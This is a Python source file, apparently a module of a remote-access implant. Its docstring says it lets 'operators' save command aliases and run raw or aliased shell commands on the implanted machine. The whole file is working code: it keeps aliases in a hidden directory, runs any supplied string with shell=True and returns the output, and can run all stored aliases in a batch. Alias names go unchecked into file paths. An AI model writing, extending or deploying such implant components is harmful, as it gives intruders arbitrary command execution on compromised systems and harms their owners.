"""Scripting API module — allows operators to define aliases and execute
multi-step command scripts from the implant.

Usage:
    alias create <name> <command>    # Save an alias
    alias list                       # List all aliases
    alias remove <name>              # Delete an alias
    exec <name> [args...]            # Execute an alias/script
    exec "raw command"               # Execute raw command (no alias needed)
    exec run                         # Run all aliases in sequence
"""

import os
import sys
import subprocess
import json
import time
from typing import Optional


def run(args: list[str]) -> str:
    """Module entry point."""
    if not args:
        return "Usage: alias [create|list|remove] [args...]\n" \
               "       exec <name> [args...]\n" \
               "       exec run"

    action = args[0].lower()

    if action == "alias":
        if len(args) < 2:
            return "Usage: alias [create|list|remove] [args...]"
        sub_action = args[1].lower()
        if sub_action == "create":
            if len(args) < 4:
                return "Usage: alias create <name> <command>"
            name = args[2]
            command = " ".join(args[3:])
            return _create_alias(name, command)
        elif sub_action == "list":
            return _list_aliases()
        elif sub_action == "remove":
            if len(args) < 3:
                return "Usage: alias remove <name>"
            return _remove_alias(args[2])
        else:
            return f"Unknown alias action: {sub_action}"

    elif action == "exec":
        if len(args) < 2:
            return "Usage: exec <name|command>\n" \
                   "       exec run (execute all aliases)"
        if args[1] == "run":
            return _execute_all()
        # Check if it's an alias name
        alias_path = _get_alias_file(args[1])
        if os.path.exists(alias_path):
            return _execute_alias(args[1], args[2:])
        else:
            # Execute as raw command
            return _execute_raw(args[1], args[2:])

    return f"Unknown action: {action}"


def _get_alias_dir() -> str:
    """Get the directory where aliases are stored."""
    return os.path.join(
        os.path.dirname(__file__), "..", "client", ".aliases"
    )


def _get_alias_file(name: str) -> str:
    """Get the path to an alias file."""
    return os.path.join(_get_alias_dir(), f"{name}.alias")


def _create_alias(name: str, command: str) -> str:
    """Save an alias."""
    alias_dir = _get_alias_dir()
    os.makedirs(alias_dir, exist_ok=True)
    alias_path = _get_alias_file(name)

    try:
        with open(alias_path, "w") as f:
            f.write(f"{command}\n")
        return f"Alias '{name}' created: {command}"
    except Exception as e:
        return f"Failed to create alias: {e}"


def _list_aliases() -> str:
    """List all saved aliases."""
    alias_dir = _get_alias_dir()
    if not os.path.exists(alias_dir):
        return "No aliases defined."

    aliases = []
    for filename in sorted(os.listdir(alias_dir)):
        if filename.endswith(".alias"):
            alias_name = filename[:-6]
            alias_path = os.path.join(alias_dir, filename)
            try:
                with open(alias_path, "r") as f:
                    command = f.read().strip()
                aliases.append(f"  {alias_name}: {command}")
            except Exception:
                aliases.append(f"  {alias_name}: [unreadable]")

    if aliases:
        return f"Defined aliases ({len(aliases)}):\n" + "\n".join(aliases)
    return "No aliases defined."


def _remove_alias(name: str) -> str:
    """Remove an alias."""
    alias_path = _get_alias_file(name)
    if os.path.exists(alias_path):
        try:
            os.remove(alias_path)
            return f"Alias '{name}' removed."
        except Exception as e:
            return f"Failed to remove alias: {e}"
    return f"Alias '{name}' not found."


def _execute_alias(name: str, extra_args: list[str]) -> str:
    """Execute a saved alias."""
    alias_path = _get_alias_file(name)
    if not os.path.exists(alias_path):
        return f"Alias '{name}' not found."

    try:
        with open(alias_path, "r") as f:
            command_template = f.read().strip()
    except Exception as e:
        return f"Failed to read alias: {e}"

    # Add extra args to the command
    if extra_args:
        command = f"{command_template} {' '.join(extra_args)}"
    else:
        command = command_template

    # Execute the command
    return _run_command(command)


def _execute_raw(command: str, args: list[str]) -> str:
    """Execute a raw command."""
    if args:
        full_command = f"{command} {' '.join(args)}"
    else:
        full_command = command
    return _run_command(full_command)


def _execute_all() -> str:
    """Execute all aliases in sequence."""
    alias_dir = _get_alias_dir()
    if not os.path.exists(alias_dir):
        return "No aliases to run."

    results = []
    for filename in sorted(os.listdir(alias_dir)):
        if filename.endswith(".alias"):
            alias_name = filename[:-6]
            alias_path = os.path.join(alias_dir, filename)
            try:
                with open(alias_path, "r") as f:
                    command = f.read().strip()
                output = _run_command(command)
                results.append(f"=== {alias_name} ===\n{output}")
            except Exception as e:
                results.append(f"=== {alias_name} ===\nError: {e}")

    if results:
        return "\n\n".join(results)
    return "No aliases to run."


def _run_command(command: str) -> str:
    """Run a shell command and return output."""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=30
        )
        output = result.stdout.strip()
        if result.stderr:
            if output:
                output += f"\n{result.stderr.strip()}"
            else:
                output = result.stderr.strip()
        return output or "Command completed (no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out (30s limit)"
    except Exception as e:
        return f"Command execution failed: {e}"
